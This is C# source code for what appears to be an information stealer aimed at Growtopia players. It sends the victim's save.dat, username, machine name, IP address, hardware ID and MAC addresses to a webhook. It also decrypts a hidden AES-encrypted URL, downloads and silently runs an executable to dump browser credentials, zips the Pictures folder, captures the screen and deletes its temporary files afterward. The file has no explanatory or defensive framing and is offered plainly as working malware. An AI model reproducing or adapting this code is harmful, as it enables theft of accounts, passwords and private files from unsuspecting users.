using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Simple
{
    class Class1
    {
        static void Main()
        {
            string savedat = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
            string picFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

            try
            {
                StreamWriter maczzz = new StreamWriter("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
                foreach (NetworkInterface bok in NetworkInterface.GetAllNetworkInterfaces())
                {
                    string mac = string.Join("", bok.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2")));
                    maczzz.Write(mac + "                                                                                                                               ");
                }
                maczzz.Close();
            }
            catch
            {
            }

            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot.png");  // saves the image
                }
            }
            catch
            {
                File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot.png");
            }

            try
            {
                bool sendAttachments = true;
                WebClient wc = new WebClient();
                string macLocation = ("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
                string IP = GrabIP();
                string macs = File.ReadAllText(macLocation);
                string str = Environment.ExpandEnvironmentVariables("%TEMP%");
                string savepath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
                string zipPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + " pictures.zip";
                string screenshot = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\" + Environment.UserName + "screenshot.png";

                string contents = RetrivePass();
                File.WriteAllText(str + "\\" + Environment.UserName + " credentials.txt", contents);
                string browsercredpath = str + "\\" + Environment.UserName + " credentials.txt";
                ZipFile.CreateFromDirectory(picFolder, zipPath);
                try
                {
                    dWebHook webHook = new dWebHook();
                    webHook.WebHook = "//webhook url";

                    //screenshot

                    //pics

                    if (File.Exists(savepath))
                        webHook.AddAttachment(savepath, Environment.UserName + " save.dat");

                    //browsercreds

                    webHook.SendMessageWithAttachment("```asciidoc\n" + "[Simple Builder] New account from:: " + Environment.UserName + " / " + Environment.MachineName + "\nIP address:: " + IP + "\nHWID:: " + GetHWID() + "\nMac addresses:: \n" + macs + "```", sendAttachments);
                    File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
                    File.Delete(macLocation);
                    File.Delete(zipPath);
                    File.Delete(screenshot);
                }
                catch
                {
                    File.Delete(zipPath);
                    File.Delete(macLocation);
                    File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
                    File.Delete(screenshot);
                }
            }
            catch
            {

            }
        }
        public static string PasteStealer(string encrypted)
        {
            string xddddasfasf = "aoI90PeaapejpsOP";
            string lmaoohehejasd = "Oi09ajhiplK0hip0goidp0jkduewsp0a";

            byte[] array = Convert.FromBase64String(encrypted);
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            rijndaelManaged.BlockSize = 128;
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.Key = Encoding.UTF8.GetBytes(lmaoohehejasd);
            rijndaelManaged.IV = Encoding.UTF8.GetBytes(xddddasfasf);
            rijndaelManaged.Padding = PaddingMode.PKCS7;
            rijndaelManaged.Mode = CipherMode.CBC;
            using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV))
            {
                byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
                return Encoding.Unicode.GetString(bytes);
            }
        }
        private static string RetrivePass()
        {
            string text = Environment.ExpandEnvironmentVariables("%TEMP%");
            WebClient webClient = new WebClient();
            webClient.DownloadFile(PasteStealer("CW/PsKH5sxTA0WGmJaxxW1ML+wT8q90jrto/c7dDT2qpe/RLNvNoRsub28By1W82Y2d0V7rQGgEj9trh+a3AIbT/Z2/izeQvy1ntGG4lya3YSpfVpW8G+500Yecb6tYEBQuTV4kkvzbjp5q8276S65gwBQJ/dFTo2ruNnKyOV6PDfRtZ5UzH106UnQJbdjKMh/1ZVkmMjpDP8KWIUprbn7srzcR+qmWhfNc9ruueUTBIud63/BuLPxaT9QdzG1j6eP4Mc7Wj0sB784SXWjm6gQ=="), text + "\\resourcefilehaha.exe");
            webClient.Dispose();
            Process process = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.FileName = text + "\\resourcefilehaha.exe";
            processStartInfo.Arguments = "/C /stext " + text + "\\credentialslmao.txt";
            ProcessStartInfo processStartInfo3 = process.StartInfo = processStartInfo;
            process.Start();
            Thread.Sleep(500);
            File.Delete(text + "\\resourcefilehaha.exe");
            string result = File.ReadAllText(text + "\\credentialslmao.txt");
            File.Delete(text + "\\credentialslmao.txt");
            return result;
        }

        static string GetHWID()
        { // Grab Hardware ID | (HWID)
            string CMD = "wmic csproduct get UUID";
            var procStartInfo = new ProcessStartInfo("cmd", "/c " + CMD)
            {
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            var proc = new Process()
            {
                StartInfo = procStartInfo
            };
            proc.Start();
            return proc.StandardOutput.ReadToEnd().Replace("UUID", string.Empty).Trim().ToUpper();
        }
        static string GrabIP()
        {
            WebClient wc = new WebClient();
            string ip = wc.DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }
    }

    public class dWebHook : IDisposable
    {
        private readonly WebClient dWebClient;
        private static MultipartFormDataContent content = new MultipartFormDataContent();
        private static List<string> filelist = new List<string>();
        public string WebHook { get; set; }

        public dWebHook()
        {
            dWebClient = new WebClient();
        }


        public void SendMessage(string msgSend, string file = null, string filename = null)
        {
            if (file != null)
            {
                byte[] bytes = File.ReadAllBytes(file);
                if (filename != null)
                {
                    content.Add(new ByteArrayContent(bytes), filename, filename);
                }
                else
                {
                    throw new Exception(@"You didn't define filename.. format: ""*.txt""");
                }
            }
            HttpClient client = new HttpClient();
            content.Add(new StringContent(msgSend), "content");
            var result = client.PostAsync(WebHook, content).Result;
            Console.WriteLine(result);
        }
        public void AddAttachment(string file, string filename)
        {
            byte[] bytes = File.ReadAllBytes(file);
            filelist.Add(Encoding.Default.GetString(bytes) + "-###Split###-" + filename);
        }
        public void SendMessageWithAttachment(string msgSend, bool attachments)
        {
            if (attachments)
            {
                foreach (string fileandname in filelist)
                {
                    string[] both = fileandname.Split(new string[] { "-###Split###-" }, StringSplitOptions.None);
                    byte[] file = Encoding.Default.GetBytes(both[0]);
                    string name = both[1];
                    content.Add(new ByteArrayContent(file), name, name);
                }
            }
            HttpClient client = new HttpClient();
            content.Add(new StringContent(msgSend), "content");
            var result = client.PostAsync(WebHook, content).Result;
            Console.WriteLine(result);
        }

        public void Dispose()
        {
            dWebClient.Dispose();
        }
    }
}
